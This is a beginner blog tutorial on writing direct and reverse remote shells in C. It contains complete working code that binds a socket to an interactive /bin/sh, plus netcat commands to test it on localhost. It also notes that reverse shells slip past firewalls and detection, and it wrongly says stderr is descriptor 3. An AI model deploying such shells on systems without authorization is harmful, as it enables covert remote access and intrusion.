--- 
layout: post 
title: Remote Shells
date: 2016-05-03   19:11
categories: Networking Programming
author: picoFlamingo
--- 
In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shell program...

**LEVEL:Beginner**

<!--more-->

## Remote Shell Use Cases

I have written and deployed remote shells a couple of times for completely legitimated reasons in my own boxes. For instance, once I need shell access to my Android phone to debug some other application. I tried a couple of SSH servers but they were performing poorly, so I ended up, deploying a small binary to remotely access it. 

From a security point of view, a remote shell is usually part of a shellcode to enable unauthorized remote access to a system. 

## Remote Shell Types

There are basically two ways to get remote shell access:

* **Direct Remote Shells**. A direct remote shell behaves as a server. It works like a ssh or telnet server. The remote user/attacker, connects to a specific port on the target machine and gets automatically access to a shell.
* **Reverse Remote Shells**. These ones work the other way around. The application running on the target machine connects back (calls back home) to a specific server and port on a machine that belongs to the user/attacker.

The Reverse Shell method has some advantages.

* Firewalls usually block incoming connections, but they allow outgoing connection in order to provide Internet access to the machine's users. 
* The user/attacker does not need to know the IP of the machine running the remote shell, but s/he needs to own a system with a fixed IP, to let the target machine __call home__.
* Usually there are many outgoing connections in a machine and only a few servers (if any) running on it. This makes detection a little bit harder, specially if the shell connects back to something listening on port 80...

## Networking. The client

Enough chatting. Let's go into the code. We will start by writing a minimal **server** and **client** functions so we can experiment with both, direct and reverse shells. Let's start with some includes:

{% highlight c lineos %}
#include <stdio.h>
#include <stdlib.h>  

#include <unistd.h> 

#include <sys/socket.h>
#include <arpa/inet.h>
{% endhighlight %}

Now, we need to write some network code. First let's write a function to establish a connection to a specific IP address and port. Something like this:

{% highlight c lineos %}
int
client_init (char *ip, int port)
{
  int                s;
  struct sockaddr_in serv;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = inet_addr(ip);

  if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0) 
    {
      perror("connect:");
      exit (EXIT_FAILURE);
    }

  return s;
}
{% endhighlight %}

The function receives as parameters an IP address to connect to and a port. Then it creates a TCP socket (**SOCK_STREAM**) and fills in the data for connecting. The connection is effectively established after a successful execution of connect. In case of any error (creating the socket or connection) we just stop the application.

This function will allow us to implement a reverse remote shell. Let's go on with the server

## Networking. The Server

The server function is a bit longer, but it is as straightforward as the client one. Let's take a look to the code first:

{% highlight c lineos %}
int
server_init (int port)
{
  int                s, s1;
  socklen_t          clen;
  struct sockaddr_in serv, client;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = htonl(INADDR_ANY);
  
  if ((bind (s, (struct sockaddr *)&serv, 
	     sizeof(struct sockaddr_in))) < 0)
    {
      perror ("bind:");
      exit (EXIT_FAILURE);
    }
  if ((listen (s, 10)) < 0)
    {
      perror ("listen:");
      exit (EXIT_FAILURE);
    }
  clen = sizeof(struct sockaddr_in);
  if ((s1 = accept (s, (struct sockaddr *) &client, 
		    &clen)) < 0)
    {
      perror ("accept:");
      exit (EXIT_FAILURE);
    }

  return s1;

}

{% endhighlight %}

As you can see, the beginning of the function is practically the same that for the client code. It creates a socket, fills in the network data, but instead of trying to connect to a remote server, it binds the socket to a specific port. Note that the address passed to **bind** is the constant **INADDR_ANY**. This is actually IP 0.0.0.0 and it means that the socket will be listening on all interfaces.

The **bind** system call does not really make the socket a __listening__ socket (you can actually call **bind** on a client socket). It is the **listen** system call the one that makes the socket a server socket. The second parameter passed to **listen** is the backlog. Basically it indicates how many connections will be queued to be accepted before the server starts rejecting connections. In our case it just do not really matter.

At this point, our server is setup and we can accept connections. The call to the **accept** system call will make our server wait for an incoming connection. Whenever it arrives a new socket will be created to interchange data with the new client.

## Starting a Shell
The last piece of our remote shell example is a function to start a shell. This is the code:

{% highlight c lineos %}
int
start_shell (int s)
{
  char *name[3] ;

  dup2 (s, 0);
  dup2 (s, 1);
  dup2 (s, 2);
  
  name[0] = "/bin/sh";
  name[1] = "-i";
  name[2] = NULL;
  execv (name[0], name );
  exit (1);

  return 0;
}
{% endhighlight %}

Again, the function is pretty simple. It makes use of two system calls **dup2** and **execv**. The first one duplicates a given file descriptor. In this case, the three calls at the beginning of the function, assigns the file descriptor received as parameter to the Standard Input (file descriptor 0), Standard Output (file descriptor 1) and Standard Error (file descriptor 3).

So, if the file descriptor we pass as a parameter is one of the sockets created with our previous client and server functions, we are effectively sending and receiving data through the network every time we write data to the console and we read data from stdin.

Now we just execute a shell with the -i flag (interactive mode). The **execv** system call will substitute the current process (whose stdin,stdout and stderr are associated to a network connection) by the one passed as parameter.

That is basically it. We just need a main function to test our remote shell application.

## The main function
The main function is pretty simple. Note that I'm not checking  the command-line arguments. That means that if you do not pass the right arguments the application will crash. This is how the **main** function looks like

{% highlight c lineos %}
int
main (int argc, char *argv[])
{
  /* FIXME: Check command-line arguments */
  if (argv[1][0] == 'c')
    start_shell (client_init (argv[2], atoi(argv[3])));
  else
    start_shell (server_init (atoi(argv[2])));
		  
  return 0;
}
{% endhighlight %}

The program expects to have a one letter first argument. If the argument is the character 'c', then it will start a reverse remote shell (running the client code) connecting back to the IP address passed as second argument and the port passed as third argument. 

Otherwise it runs in server mode (direct remote shell) and uses the second argument as the port to bind to.

## Testing
So, let's test our small program. You can just compile it using **make**. I called my file **rs.c** and I compiled it just typing:

make rs

For the tests we will need two terminals. 

First we will test the direct remote shell. In one terminal you have to start the application in server mode:

$ ./rs s 5000

This will start a TCP server waiting for connections on port 5000. Now, from another terminal use netcat to connect to the server:

$ nc 127.0.0.1 5000

That's it. It is better if you run the netcat command from a different directory, otherwise it will look like nothing had happened.

Leave the session typing exit in your netcat terminal or pressing CTRL+D and let's try the reverse remote shell.

Now we start in one of the terminals a netcat in server mode. When we run our application on the target system, it will connect back to this netcat window.

nc -l -p 5000

In the other terminal we start the reverse shell with a command like this:

$ ./rs c 127.0.0.1 5000

You will get immediately a prompt in your netcat terminal and access to the target machine that just called back home.


## NEXT

Hope you enjoyed this basic tutorial. We will be improving this basic program in future posts, as we keep improving our network programing skills.


